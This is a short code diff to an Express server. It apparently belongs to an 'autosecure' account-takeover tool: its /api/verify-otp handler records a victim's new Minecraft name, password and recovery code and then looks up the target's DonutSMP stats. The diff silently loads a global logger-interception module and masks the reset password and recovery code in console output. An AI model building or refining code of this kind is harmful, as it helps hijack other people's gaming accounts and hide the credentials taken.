@@ -1,3 +1,8 @@
+try {
+  const { attachGlobalLoggerGuard } = require('./autosecure/utils/logging/interceptLogger');
+  if (attachGlobalLoggerGuard) attachGlobalLoggerGuard();
+} catch (e) {}
+
 const express = require('express');
 const path = require('path');
 const fs = require('fs');
@@ -474,8 +479,8 @@ app.post('/api/verify-otp', async (req, res) => {
 
         console.log(`[API /verify-otp] [✔] VinGroup hoàn tất! UID: ${uid}`);
         console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
-        console.log(` • Mật khẩu mới : ${acc.password || 'N/A'}`);
-        console.log(` • Recovery Code: ${acc.recoveryCode || 'N/A'}`);
+        console.log(` • Mật khẩu mới : ${acc.password ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
+        console.log(` • Recovery Code: ${acc.recoveryCode ? '[ĐÃ CẬP NHẬT]' : 'N/A'}`);
 
         // Query DonutSMP stats
         const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
